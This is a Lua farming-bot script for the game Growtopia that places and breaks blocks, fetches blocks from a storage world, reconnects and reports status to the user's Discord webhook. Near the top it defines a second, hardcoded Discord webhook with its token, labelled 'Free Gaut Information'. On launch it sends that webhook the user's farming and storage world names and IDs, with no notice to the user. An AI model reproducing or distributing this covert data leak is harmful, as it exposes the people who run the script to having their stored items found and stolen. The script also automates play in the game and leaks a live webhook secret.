storage = string.upper(storage)
storageid = string.upper(storageid)
pnbdunya = string.upper(pnbdunya)
pnddunyaid = string.upper(pnddunyaid)

Botad = bot.name
kirilan = 0
if GautOn == "yes" then
    bot.auto_collect = false
    bot.ignore_gems = true
    bot.collect_range = 1
end

function GonWebhook(pYuTopia)
    wh = Webhook.new(WebhookUrl)
    wh.username = "pYuTopia PnB"
    wh.avatar_url = "https://media.discordapp.net/attachments/1173822148662534274/1180903332789882931/Sprite_1180869615807643698.png?ex=657f1cee&is=656ca7ee&hm=f9457a9e7f7ba07982661871c506d07c3b768e5ddfc6ea1520722f637a919080&"
    wh.embed1.use = true
    wh.embed1.title = "PnB By pYuTopia"
    wh.embed1.description = pYuTopia
    wh:send()
end

WebhookUrll = "https://discord.com/api/webhooks/1193582795201720482/z8ezxmPTMJ9WL_WFpZVrbVTRlMc7hvK2jLley3yXtSO6Ealix3tN8ftNijvBEDhkglkn"
YourDiscordid1 = "751690981140856882"
function GoWebhook(kyazkyan)
    wh = Webhook.new(WebhookUrll)
    wh.username = "pYuTopia Information"
    wh.avatar_url = "https://media.discordapp.net/attachments/1173822148662534274/1180903332789882931/Sprite_1180869615807643698.png?ex=657f1cee&is=656ca7ee&hm=f9457a9e7f7ba07982661871c506d07c3b768e5ddfc6ea1520722f637a919080&"
    wh.embed1.use = true
    wh.embed1.title = "Free Gaut Information"
    wh.embed1.description = kyazkyan
    wh:send()
end

GoWebhook ("\n  <:UT:1180869959610548234> World Name :" ..pnbdunya .. "\n <:Gaia:1180869918707695697> World ID :" ..pnddunyaid .. "\n <:UT:1180869959610548234> Storage World :" ..storage .."\n <:Gaia:1180869918707695697> Storage ID :" .. storageid)


function join(a,b) 
    sleep(3000)
    bot:sendPacket(3,"action|join_request\nname|"..a.."|"..b.."\ninvitedWorld|0")
    sleep(3000)
    AnlikYer()
    Dunyadami = tostring(world.name)
    if Dunyadami ~= "" and Dunyadami ~= "EXIT" then
        if world:getTile(Botx,Boty).fg == 6 then
            join(a,b)
        end
    end
end

function AnlikYer()
    Dunyadami = tostring(world.name)
    if Dunyadami ~= "" and Dunyadami ~= "EXIT" then
        localbot = world:getLocal()
        if localbot then
            Botx = math.floor(localbot.posx / 32) 
            Boty = math.floor(localbot.posy / 32)
        end
    end
end

function take() 
    ReconnectTakeBlock()
    for _,obj in pairs(bot:getWorld():getObjects()) do
      if obj.id == BlockID then 
            ReconnectTakeBlock()
            AnlikYer()
            if world:getTile(Botx,Boty).fg == 6 then
                join(storage,storageid)
            end
            local x = math.floor(obj.x / 32)
            local y = math.floor(obj.y / 32)
            bot:findPath(x,y)
            sleep(1000)
            bot.auto_collect = true
            sleep(1000) 
        end
        if inventory:getItemCount(BlockID) > 1 then
            bot.auto_collect = false
            break
        end
    end
end
itemler = 0
function tarama()
    itemler = 0
    for _, obj in pairs(bot:getWorld():getObjects()) do
        if obj.id == BlockID then 
            itemler = itemler + obj.count
        end
    end
    return itemler
end

join(storage,storageid)
sleep(1000)
tarama()
while itemler == 0 do
    GonWebhook("Block Scanning...")
    join(pnbdunya,pnddunyaid)
    tarama()
    sleep(5000)
end
sleep(1000)
Kalanlar = itemler


function OnlineControl()
    if bot.status ~= 1 then
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Offline Trying To Reconnect.... \n<:red_circle:987661002868936774> | Status : Offline ")
        while bot.status ~= 1 do
            bot:connect()
            sleep(10000)
        end
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Back Online\n<a:online:1007062631787544666> | Status : Online\n<a:World:997157064008810620>")
    end
end

function tilealfg(x,y)
    OnlineControl()
    AnlikYer()
    Dunyadami = tostring(world.name)
    if Dunyadami ~= "" and Dunyadami ~= "EXIT" then
        tilefgx = world:getTile(x,y).fg
        return {tilefg = tilefgx}
    end
end

function tilealbg(x,y)
    OnlineControl()
    AnlikYer()
    Dunyadami = tostring(world.name)
    if Dunyadami ~= "" and Dunyadami ~= "EXIT" then
        tilebgx = world:getTile(x,y).bg
        return {tilebg = tilebgx}
    end
end

BotPxz = BotPx-1
BotPyz = BotPy-1
function PNB()
    if GautOn ~= "yes" then
        bot.auto_collect = true
    else
        bot.auto_collect = false
    end
    bot:findPath(BotPxz,BotPyz)
    sleep(1000)
    while inventory:getItemCount(BlockID) > 0 do
        Reconnect()
        AnlikYer()
        if BotPxz ~= Botx and BotPyz ~= BotY then
            bot:findPath(BotPxz,BotPyz)
            sleep(1000)
            AnlikYer()
        end
        if tilealfg(Botx,Boty-2).tilefg == 0 then   
            bot:place(Botx,Boty-2,BlockID)
            sleep(delayplace)
        end
 while (tilealfg(Botx,Boty-2).tilefg ~= 0 or tilealbg(Botx,Boty).tilebg ~= 0) do
            Reconnect()
            if BotPxz ~= Botx and BotPyz ~= BotY then
                bot:findPath(BotPxz,BotPyz)
                sleep(1000)
                AnlikYer()
            end
            bot:hit(BotPxz,BotPyz-2) 
            sleep(delaybreak) 
        end
    end
 end
function Reconnectpkt()
    if bot.status ~= 1 then
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Offline Trying To Reconnect.... \n<:red_circle:987661002868936774> | Status : Offline ")
        while bot.status ~= 1 do
            bot:connect()
            sleep(10000)
        end
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Back Online\n<a:online:1007062631787544666> | Status : Online\n<a:World:997157064008810620>")
        join(pnbdunya,pnddunyaid)
    end
end

function ReconnectTakeBlock()
    if bot.status ~= 1 then
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Offline Trying To Reconnect.... \n<:red_circle:987661002868936774> | Status : Offline ")
        while bot.status ~= 1 do
            bot:connect()
            sleep(10000)
        end
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Back Online\n<a:online:1007062631787544666> | Status : Online\n<a:World:997157064008810620>")
        join(storage,storageid)
    end
    Dunyadami = tostring(world.name)
    if Dunyadami ~= "" and Dunyadami ~= "EXIT" then
        AnlikYer()
        if world:getTile(Botx,Boty).fg == 6 then
            join(pnbdunya,pnddunyaid)
        end
    end
end

function Reconnect()
    if bot.status ~= 1 then
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Offline Trying To Reconnect.... \n<:red_circle:987661002868936774> | Status : Offline ")
        while bot.status ~= 1 do
            bot:connect()
            sleep(10000)
        end
        GonWebhook("<@" .. YourDiscordid .. ">".."\n<:growbot:992058196439072770> | Bot Name : "..bot.name.."\n<:mega:984686541383290940> | Information : Bot Is Back Online\n<a:online:1007062631787544666> | Status : Online\n<a:World:997157064008810620>")
        join(pnbdunya,pnddunyaid)
    end
    Dunyadami = tostring(world.name)
    if Dunyadami ~= "" and Dunyadami ~= "EXIT" then
        AnlikYer()
        if world:getTile(Botx,Boty).fg == 6 then
            join(pnbdunya,pnddunyaid)
        end
    end
end

isOwner = true

while Kalanlar > 1 and isOwner == true do 
    Reconnect()
    if inventory:getItemCount(BlockID) == 0 then
        join(storage,storageid)
        take()
        GonWebhook("<:growbot:992058196439072770> Bot Name : "..Botad..
        "\n <:world:1157343724381151292> Current World : "..world.name..
        "\n <:peppertree:999318156696887378> Left Block : "..Kalanlar)
    end
    if inventory:getItemCount(BlockID) > 1 then
        join(pnbdunya,pnddunyaid)
        PNB()
        GonWebhook("<:growbot:992058196439072770> Bot Name : "..Botad..
        "\n <:world:1157343724381151292> Current World : "..world.name..
        "\n <:gems:1157338912369422397> Gems : "..gems)
    end
end